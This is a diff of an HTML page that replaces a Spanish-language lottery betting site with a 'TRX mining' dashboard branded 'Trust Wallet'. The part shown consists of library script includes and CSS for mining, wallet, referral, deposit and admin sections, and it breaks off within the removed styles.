@@ -3,2940 +3,2123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Florida Lotería - Sistema de Apuestas</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Sistema de Minería TRX 2025 - Trust Wallet</title>
+    <!-- Firebase App (core) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <!-- Firebase Auth -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <!-- Firebase Firestore -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <!-- Web3 para conectar con Trust Wallet -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <style>
         :root {
-            --primary: #F4B315;
-            --secondary: #E59312;
-            --accent: #D3AF85;
-            --light-accent: #8E5915;
-            --background: #423738;
-            --text: #FFFFFF;
-            --light-text: #D3AF85;
-            --success: #4CAF50;
-            --warning: #FF9800;
-            --danger: #F44336;
-            --white: #1A141A;
-            --info: #2196F3;
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --referral: #9b59b6;
+            --admin: #d35400;
         }
-
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            background-color: var(--background);
-            color: var(--text);
-            min-height: 100vh;
-            overflow-x: hidden;
+            background-color: #f5f7fa;
+            color: var(--dark);
+            line-height: 1.6;
         }
-
+        
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 15px;
-            width: 100%;
+            padding: 20px;
         }
-
+        
         header {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            padding: 15px 0;
-            border-bottom: 1px solid var(--light-accent);
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+        
+        .app-title {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .app-subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            font-size: 1.5rem;
+            color: var(--secondary);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--light);
+        }
+        
+        .form-group {
             margin-bottom: 20px;
         }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
         }
-
-        .logo h1 {
-            font-size: 1.5rem;
-            color: var(--primary);
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus, textarea:focus {
+            border-color: var(--secondary);
+            outline: none;
+        }
+        
+        button {
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        
+        button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+        }
+        
+        .btn-success {
+            background: linear-gradient(to right, var(--success), #27ae60);
+        }
+        
+        .btn-warning {
+            background: linear-gradient(to right, var(--warning), #e67e22);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(to right, var(--accent), #c0392b);
+        }
+        
+        .btn-referral {
+            background: linear-gradient(to right, var(--referral), #8e44ad);
+        }
+        
+        .btn-admin {
+            background: linear-gradient(to right, var(--admin), #e67e22);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        
+        .stat-card {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        
+        .stat-value {
+            font-size: 2.5rem;
             font-weight: 700;
+            color: var(--secondary);
+            margin: 15px 0;
         }
-
-        .logo-icon {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
+        
+        .stat-label {
+            font-size: 1.1rem;
+            color: #7f8c8d;
+        }
+        
+        .transaction-list {
+            list-style: none;
+        }
+        
+        .transaction-item {
+            padding: 15px;
+            border-left: 4px solid var(--secondary);
+            background-color: #f8f9fa;
+            margin-bottom: 10px;
+            border-radius: 0 6px 6px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .transaction-item.withdrawal {
+            border-left-color: var(--accent);
+        }
+        
+        .transaction-item.referral {
+            border-left-color: var(--referral);
+        }
+        
+        .transaction-item.pending {
+            border-left-color: var(--warning);
+        }
+        
+        .transaction-amount {
+            font-weight: 700;
+            color: var(--success);
+        }
+        
+        .transaction-amount.withdrawal {
+            color: var(--accent);
+        }
+        
+        .transaction-amount.referral {
+            color: var(--referral);
+        }
+        
+        .transaction-amount.pending {
+            color: var(--warning);
+        }
+        
+        .mining-animation {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .miner {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        
+        .miner-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(var(--secondary) 0%, var(--primary) 30%, var(--secondary) 40%, var(--primary) 60%, var(--secondary) 70%, var(--primary) 100%);
+            animation: rotate 3s linear infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .miner-inner {
+            width: 70%;
+            height: 70%;
+            background: white;
             border-radius: 50%;
             display: flex;
-            align-items: center;
             justify-content: center;
-            font-weight: bold;
-            font-size: 1rem;
-            color: var(--white);
-        }
-
-        .user-info {
-            display: flex;
-            flex-wrap: wrap;
             align-items: center;
-            gap: 10px;
-            width: 100%;
-        }
-
-        .user-name {
-            font-weight: 600;
+            font-weight: 700;
             color: var(--secondary);
-            margin-right: 10px;
         }
-
-        .balance {
-            background: var(--white);
-            padding: 6px 12px;
+        
+        @keyframes rotate {
+            from {
+                transform: rotate(0);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .nav {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .nav-item {
+            margin: 0 10px 10px;
+            padding: 10px 20px;
+            background-color: white;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s;
+        }
+        
+        .nav-item.active {
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            color: white;
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border-left: 4px solid #28a745;
+        }
+        
+        .alert-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-left: 4px solid #dc3545;
+        }
+        
+        .alert-info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border-left: 4px solid #17a2b8;
+        }
+        
+        .alert-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid var(--secondary);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        
+        .miners-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .miner-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s;
+        }
+        
+        .miner-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+        }
+        
+        .miner-card.active {
+            border: 2px solid var(--success);
+        }
+        
+        .miner-card.inactive {
+            opacity: 0.7;
+        }
+        
+        .miner-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .miner-name {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .miner-desc {
+            font-size: 0.9rem;
+            color: #7f8c8d;
+            margin-bottom: 15px;
+        }
+        
+        .miner-profit {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--success);
+            margin-bottom: 15px;
+        }
+        
+        .countdown-timer {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--secondary);
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        
+        .password-reset {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .password-reset a {
+            color: var(--secondary);
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .password-reset a:hover {
+            text-decoration: underline;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .support-ticket {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            background-color: #f9f9f9;
+        }
+        
+        .ticket-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .ticket-status {
+            padding: 5px 10px;
             border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        
+        .status-open {
+            background-color: #ffeaa7;
+            color: #d35400;
+        }
+        
+        .status-pending {
+            background-color: #81ecec;
+            color: #00cec9;
+        }
+        
+        .status-resolved {
+            background-color: #55efc4;
+            color: #00b894;
+        }
+        
+        .ticket-messages {
+            margin-top: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .message {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+        
+        .message-user {
+            background-color: #dfe6e9;
+            text-align: right;
+        }
+        
+        .message-admin {
+            background-color: #74b9ff;
+            color: white;
+        }
+        
+        .wallet-connection {
             display: flex;
             align-items: center;
-            gap: 5px;
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+        }
+        
+        .wallet-status {
+            margin-left: 15px;
+        }
+        
+        .connected {
+            color: var(--success);
             font-weight: 600;
-            border: 1px solid var(--light-accent);
-            font-size: 0.9rem;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
-
-        .balance-amount {
-            color: var(--primary);
-        }
-
-        .cup-icon {
-            color: var(--primary);
-        }
-
-        .auth-btn {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border: none;
-            padding: 8px 15px;
-            border-radius: 20px;
-            color: var(--white);
+        
+        .disconnected {
+            color: var(--accent);
             font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(110, 52, 130, 0.2);
-            font-size: 0.9rem;
-            white-space: nowrap;
         }
-
-        .auth-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(110, 52, 130, 0.3);
+        
+        .transaction-hash {
+            font-size: 0.8rem;
+            word-break: break-all;
+            margin-top: 5px;
+            color: #7f8c8d;
         }
-
-        .logout-btn {
-            background: rgba(244, 67, 54, 0.1);
-            border: 1px solid var(--danger);
-            color: var(--danger);
+        
+        .referral-system {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
         }
-
-        .logout-btn:hover {
-            background: rgba(244, 67, 54, 0.2);
-            box-shadow: 0 6px 15px rgba(244, 67, 54, 0.1);
+        
+        .referral-link {
+            background: white;
+            color: #9b59b6;
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 15px 0;
         }
-
-        .main-content {
+        
+        .referral-stats {
             display: grid;
-            grid-template-columns: 1fr;
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
         }
-
-        @media (min-width: 768px) {
-            header {
-                flex-direction: row;
-                justify-content: space-between;
+        
+        .referral-stat {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .referral-stat-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .level-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            background: var(--referral);
+            color: white;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+        
+        /* Nuevos estilos para el contador moderno */
+        .modern-countdown {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 25px 0;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .countdown-title {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            opacity: 0.9;
+        }
+        
+        .countdown-digits {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .countdown-digit {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 15px;
+            border-radius: 10px;
+            min-width: 80px;
+        }
+        
+        .digit-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .digit-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .mining-progress {
+            background: rgba(255, 255, 255, 0.15);
+            height: 10px;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: var(--success);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 5px;
+        }
+        
+        .accumulated-earnings {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-top: 15px;
+            color: var(--success);
+        }
+        
+        .deposit-status {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .deposit-info {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .deposit-amount {
+            font-weight: 700;
+            color: var(--success);
+        }
+        
+        .deposit-date {
+            font-size: 0.9rem;
+            color: #7f8c8d;
+        }
+        
+        .deposit-action {
+            display: flex;
+            gap: 10px;
+        }
+        
+        /* Estilos para la billetera virtual */
+        .wallet-section {
+            margin-bottom: 25px;
+        }
+        
+        .wallet-card {
+            background: linear-gradient(135deg, #3498db, #2c3e50);
+            color: white;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .wallet-balance {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .wallet-actions {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .wallet-action-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .wallet-action-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-3px);
+        }
+        
+        .wallet-transactions {
+            margin-top: 25px;
+        }
+        
+        .transaction-type {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-right: 8px;
+        }
+        
+        .type-deposit {
+            background-color: var(--success);
+            color: white;
+        }
+        
+        .type-withdrawal {
+            background-color: var(--accent);
+            color: white;
+        }
+        
+        .type-mining {
+            background-color: var(--secondary);
+            color: white;
+        }
+        
+        .type-referral {
+            background-color: var(--referral);
+            color: white;
+        }
+        
+        .type-pending {
+            background-color: var(--warning);
+            color: white;
+        }
+        
+        .trust-connect {
+            background: linear-gradient(135deg, #3375bb, #2a5f9e);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .trust-connect button {
+            background: linear-gradient(to right, #3375bb, #2a5f9e);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .admin-section {
+            border: 2px solid var(--admin);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            background: #fffaf0;
+        }
+        
+        .admin-title {
+            color: var(--admin);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .pending-deposits {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .pending-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .pending-details {
+            flex: 1;
+        }
+        
+        .pending-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .miners-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .app-title {
+                font-size: 2rem;
+            }
+            
+            .nav {
+                flex-direction: column;
                 align-items: center;
             }
             
-            .user-info {
-                width: auto;
-                justify-content: flex-end;
+            .nav-item {
+                margin-bottom: 10px;
+                width: 80%;
+                text-align: center;
             }
             
-            .logo h1 {
+            .button-group {
+                flex-direction: column;
+            }
+            
+            .button-group button {
+                width: 100%;
+            }
+            
+            .wallet-connection {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .wallet-status {
+                margin-left: 0;
+                margin-top: 10px;
+            }
+            
+            .referral-stats {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .countdown-digits {
+                flex-wrap: wrap;
+            }
+            
+            .countdown-digit {
+                min-width: 60px;
+                flex: 1;
+            }
+            
+            .digit-value {
                 font-size: 1.8rem;
             }
             
-            .logo-icon {
-                width: 40px;
-                height: 40px;
-                font-size: 1.2rem;
+            .wallet-actions {
+                flex-direction: column;
             }
-        }
-
-        @media (min-width: 992px) {
-            .main-content {
-                grid-template-columns: 1fr 1fr;
+            
+            .pending-item {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
             }
-        }
-
-        .panel {
-            background: var(--white);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid var(--light-accent);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s;
-        }
-
-        .panel:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-        }
-
-        .panel-title {
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-            color: var(--secondary);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .panel-title svg {
-            width: 20px;
-            height: 20px;
-        }
-
-        .number-grid {
-            display: grid;
-            grid-template-columns: repeat(10, 1fr);
-            gap: 4px;
-            margin-bottom: 15px;
-        }
-
-        @media (max-width: 768px) {
-            .number-grid {
-                grid-template-columns: repeat(5, 1fr);
-                gap: 3px;
+            
+            .pending-actions {
+                justify-content: center;
             }
-        }
-
-        .number-btn {
-            aspect-ratio: 1/1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 4px;
-            color: var(--text);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            position: relative;
-            overflow: hidden;
-            font-size: 0.8rem;
-            padding: 2px;
-        }
-
-        .number-btn:hover {
-            background: rgba(244, 179, 21, 0.1);
-            border-color: var(--primary);
-            transform: translateY(-2px);
-        }
-
-        .number-btn.selected {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border-color: var(--primary);
-            color: var(--white);
-            box-shadow: 0 5px 10px rgba(244, 179, 21, 0.2);
-            transform: scale(1.05);
-        }
-
-        .number-btn.limited {
-            background: rgba(244, 179, 21, 0.1);
-            border-color: var(--primary);
-        }
-
-        .number-btn.limited.selected {
-            background: linear-gradient(45deg, var(--primary), #E59312);
-            border-color: var(--primary);
-        }
-
-        .number-btn.disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            pointer-events: none;
-            background: var(--white);
-        }
-
-        .bet-controls {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 15px;
-        }
-
-        .bet-amount {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .bet-amount input {
-            flex: 1;
-            padding: 10px 12px;
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 10px;
-            color: var(--text);
-            font-size: 0.9rem;
-            outline: none;
-            min-width: 0;
-        }
-
-        .bet-amount input:focus {
-            border-color: var(--primary);
-        }
-
-        .quick-bets {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .quick-bet {
-            padding: 6px 12px;
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 20px;
-            color: var(--text);
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 0.85rem;
-        }
-
-        .quick-bet:hover {
-            background: rgba(244, 179, 21, 0.1);
-            border-color: var(--primary);
-        }
-
-        .place-bet {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border: none;
-            padding: 10px;
-            border-radius: 10px;
-            color: var(--white);
-            font-weight: 600;
-            font-size: 0.9rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-            box-shadow: 0 5px 10px rgba(244, 179, 21, 0.2);
-        }
-
-        .place-bet:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 15px rgba(244, 179, 21, 0.3);
-        }
-
-        .place-bet:disabled {
-            background: var(--light-accent);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .results-panel, .my-bets-panel {
-            grid-column: 1 / -1;
-        }
-
-        .results-list, .bets-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            max-height: 300px;
-            overflow-y: auto;
-            padding-right: 8px;
-        }
-
-        .result-item, .bet-item {
-            background: var(--white);
-            border-radius: 10px;
-            padding: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.2s;
-            font-size: 0.9rem;
-            border: 1px solid var(--light-accent);
-        }
-
-        .result-item:hover, .bet-item:hover {
-            background: rgba(244, 179, 21, 0.05);
-        }
-
-        .result-number {
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: var(--primary);
-        }
-
-        .result-date {
-            color: var(--light-text);
-            font-size: 0.8rem;
-        }
-
-        .result-prize {
-            font-weight: 600;
-            color: var(--primary);
-        }
-
-        .bet-numbers {
-            display: flex;
-            gap: 4px;
-            flex-wrap: wrap;
-        }
-
-        .bet-number {
-            background: rgba(244, 179, 21, 0.1);
-            padding: 4px 8px;
-            border-radius: 5px;
-            font-weight: 600;
-            font-size: 0.8rem;
-        }
-
-        .bet-amount-display {
-            font-weight: 600;
-            color: var(--primary);
-            font-size: 0.9rem;
-        }
-
-        .bet-status {
-            padding: 4px 8px;
-            border-radius: 5px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-
-        .bet-status.pending {
-            background: rgba(255, 152, 0, 0.1);
-            color: var(--warning);
-        }
-
-        .bet-status.approved {
-            background: rgba(76, 175, 80, 0.1);
-            color: var(--success);
-        }
-
-        .bet-status.won {
-            background: rgba(76, 175, 80, 0.1);
-            color: var(--success);
-        }
-
-        .bet-status.lost {
-            background: rgba(244, 67, 54, 0.1);
-            color: var(--danger);
-        }
-
-        .dice-game {
-            margin-top: 20px;
-        }
-
-        .dice-bet-options {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        @media (min-width: 576px) {
-            .dice-bet-options {
-                grid-template-columns: repeat(6, 1fr);
-            }
-        }
-
-        .dice-bet-option {
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 8px;
-            padding: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .dice-bet-option:hover {
-            background: rgba(244, 179, 21, 0.1);
-            border-color: var(--primary);
-        }
-
-        .dice-bet-option.selected {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border-color: var(--primary);
-            color: var(--white);
-            box-shadow: 0 5px 10px rgba(244, 179, 21, 0.2);
-        }
-
-        .dice-bet-number {
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
-
-        .dice-bet-multiplier {
-            font-size: 0.8rem;
-            color: var(--primary);
-            margin-top: 3px;
-        }
-
-        .dice-results {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 15px 0;
-        }
-
-        .dice {
-            width: 60px;
-            height: 60px;
-            background: var(--white);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            font-weight: bold;
-            color: var(--primary);
-            border: 1px solid var(--light-accent);
-        }
-
-        .dice-result {
-            text-align: center;
-            margin-top: 10px;
-            font-weight: bold;
-        }
-
-        .dice-win {
-            color: var(--success);
-        }
-
-        .dice-lose {
-            color: var(--danger);
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.3s;
-            backdrop-filter: blur(5px);
-            padding: 15px;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .modal {
-            background: var(--white);
-            border-radius: 12px;
-            padding: 20px;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            transform: translateY(20px);
-            transition: all 0.3s;
-            border: 1px solid var(--light-accent);
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .modal-overlay.active .modal {
-            transform: translateY(0);
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .modal-title {
-            font-size: 1.3rem;
-            color: var(--secondary);
-        }
-
-        .close-modal {
-            background: none;
-            border: none;
-            color: var(--light-text);
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: all 0.2s;
-            line-height: 1;
-        }
-
-        .close-modal:hover {
-            color: var(--primary);
-        }
-
-        .modal-body {
-            margin-bottom: 15px;
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            color: var(--light-text);
-            font-size: 0.9rem;
-        }
-
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 10px 12px;
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            border-radius: 10px;
-            color: var(--text);
-            font-size: 0.9rem;
-            outline: none;
-        }
-
-        .form-group input:focus, .form-group select:focus {
-            border-color: var(--primary);
-        }
-
-        .modal-footer {
-            display: flex;
-            justify-content: flex-end;
-            gap: 8px;
-        }
-
-        .modal-btn {
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 0.9rem;
-        }
-
-        .modal-btn.cancel {
-            background: var(--white);
-            border: 1px solid var(--light-accent);
-            color: var(--text);
-        }
-
-        .modal-btn.cancel:hover {
-            background: rgba(244, 179, 21, 0.05);
-        }
-
-        .modal-btn.confirm {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border: none;
-            color: var(--white);
-            box-shadow: 0 5px 10px rgba(244, 179, 21, 0.2);
-        }
-
-        .modal-btn.confirm:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 15px rgba(244, 179, 21, 0.3);
-        }
-
-        .auth-form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .auth-form .form-group {
-            margin-bottom: 0;
-        }
-
-        .auth-form-footer {
-            text-align: center;
-            margin-top: 10px;
-            color: var(--light-text);
-            font-size: 0.85rem;
-        }
-
-        .auth-form-footer a {
-            color: var(--primary);
-            text-decoration: none;
-            cursor: pointer;
-        }
-
-        .auth-form-footer a:hover {
-            text-decoration: underline;
-        }
-
-        .receipt {
-            background: var(--white);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
